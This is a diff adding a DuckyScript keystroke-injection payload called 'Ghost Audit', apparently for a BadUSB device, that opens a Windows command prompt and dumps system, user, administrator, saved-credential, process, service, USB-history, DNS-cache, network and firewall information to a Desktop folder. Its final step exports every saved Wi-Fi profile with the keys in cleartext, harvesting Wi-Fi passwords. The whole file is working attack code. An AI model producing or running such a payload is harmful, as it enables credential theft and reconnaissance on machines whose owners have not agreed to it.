@@ -1,0 +1,104 @@
+REM --- Ghost Audit(Detailed Mode Payload)---
+DEFAULT_DELAY 200
+
+REM --- STEP 1: RUN CMD ---
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+
+REM VISUAL IMPROVEMENTS
+STRING @echo off
+ENTER
+STRING cls
+ENTER
+
+REM --- STEP 2: CREATING THE BASE FILES ---
+STRING md "%USERPROFILE%\Desktop\PC_Audit_Logs"
+ENTER
+STRING md "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System"
+ENTER
+STRING md "%USERPROFILE%\Desktop\PC_Audit_Logs\2_Network"
+ENTER
+STRING md "%USERPROFILE%\Desktop\PC_Audit_Logs\3_WiFi"
+ENTER
+DELAY 500
+
+REM --- STEP 3: SYSTEM ANALYSIS(1_System) ---
+STRING wmic logicaldisk get caption,description,filesystem,size,freespace > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\Disk_Info.txt"
+ENTER
+STRING wmic memorychip get capacity,speed,manufacturer > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\RAM_Info.txt"
+ENTER
+STRING wmic cpu get name,numberofcores > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\CPU_Info.txt"
+ENTER
+DELAY 500
+STRING net user > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\Users.txt"
+ENTER
+STRING net localgroup administrators > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\Admins.txt"
+ENTER
+STRING cmdkey /list > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\Saved_Credentials_List.txt"
+ENTER
+DELAY 300
+STRING tasklist /v > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\Running_Processes.txt"
+ENTER
+DELAY 300
+STRING wmic startup get caption,command > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\Startup_Apps.txt"
+ENTER
+DELAY 1000
+ENTER
+STRING wmic service get name,displayname,state,startmode > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\All_Services.txt"
+ENTER
+DELAY 1500
+ENTER
+STRING set > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\Env_Variables.txt"
+ENTER
+DELAY 300
+STRING reg query HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR /s | findstr "FriendlyName" > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\USB_History.txt"
+ENTER
+DELAY 500
+STRING reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr "DisplayName" > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\Installed_Software.txt"
+ENTER
+DELAY 8000
+STRING systeminfo > "%USERPROFILE%\Desktop\PC_Audit_Logs\1_System\Full_OS_Info.txt"
+ENTER
+DELAY 8000
+
+REM --- STEP 4: NETWORK ANALYSIS (2_Network) ---
+
+STRING ipconfig /all > "%USERPROFILE%\Desktop\PC_Audit_Logs\2_Network\IP_Config.txt"
+ENTER
+STRING ipconfig /displaydns > "%USERPROFILE%\Desktop\PC_Audit_Logs\2_Network\DNS_History.txt"
+ENTER
+STRING arp -a > "%USERPROFILE%\Desktop\PC_Audit_Logs\2_Network\ARP_Table.txt"
+ENTER
+STRING route print > "%USERPROFILE%\Desktop\PC_Audit_Logs\2_Network\Route_Table.txt"
+ENTER
+STRING netstat -ano > "%USERPROFILE%\Desktop\PC_Audit_Logs\2_Network\Active_Connections.txt"
+ENTER
+DELAY 500
+STRING net share > "%USERPROFILE%\Desktop\PC_Audit_Logs\2_Network\Network_Shares.txt"
+ENTER
+STRING netsh advfirewall show allprofiles > "%USERPROFILE%\Desktop\PC_Audit_Logs\2_Network\Firewall_State.txt"
+ENTER
+STRING type C:\Windows\System32\drivers\etc\hosts > "%USERPROFILE%\Desktop\PC_Audit_Logs\2_Network\Hosts_File.txt"
+ENTER
+DELAY 500
+
+REM --- STEP 5: WIRELESS ANALYSIS (3_WiFi) ---
+STRING netsh wlan show networks mode=bssid > "%USERPROFILE%\Desktop\PC_Audit_Logs\3_WiFi\Nearby_Networks_Scan.txt"
+ENTER
+DELAY 1000
+STRING netsh wlan show all > "%USERPROFILE%\Desktop\PC_Audit_Logs\3_WiFi\Full_Report.txt"
+ENTER
+DELAY 500
+STRING FOR /F "skip=9 tokens=*" %A IN ('NETSH WLAN SHOW PROFILES') DO FOR /F "tokens=2 delims=:" %B IN ("%A") DO FOR /F "tokens=*" %C IN ("%B") DO NETSH WLAN EXPORT PROFILE name="%C" folder="%USERPROFILE%\Desktop\PC_Audit_Logs\3_WiFi" key=clear
+ENTER
+DELAY 3000
+
+REM --- FINAL STEP ---
+STRING cls
+ENTER
+DELAY 2000
+STRING exit
+ENTER
